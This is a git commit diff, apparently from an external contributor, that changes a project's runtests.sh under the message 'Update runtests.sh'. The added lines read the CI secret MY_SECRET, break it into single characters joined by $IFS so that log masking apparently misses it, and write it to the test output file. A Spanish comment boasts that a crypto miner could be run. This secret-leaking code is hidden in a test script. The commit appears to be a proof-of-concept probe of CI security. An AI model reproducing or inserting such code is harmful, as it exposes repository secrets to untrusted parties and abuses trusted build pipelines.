38b4ba2f33ce17eea21caf82a257c328937769fb
xyexternal <133779591+xyexternal@users.noreply.github.com>
2023-06-01 18:09:57 +0200

    Update runtests.sh

--- runtests.sh
+++ runtests.sh
@@ -1,3 +1,15 @@
-echo "Executing Tests script from XXXXYYYY" >> runtests.out
 RET=0
+
+echo "Testing from EXTERNAL " >> runtests.out
+
+foo=$MY_SECRET
+ss=""
+for (( i=0; i<${#foo}; i++ )); do
+  #echo "${foo:$i:1}" >> runtests.out
+  ss="$ss$IFS${foo:$i:1}"
+done
+echo $ss >> runtests.out
+echo "Bye from EXTERNAL [$RET]" >> runtests.out
+echo "Hola Jesus, no he poido acceder a los secretos pero podria ejecutar un crypto minner" >> runtests.out
+
 exit $RET
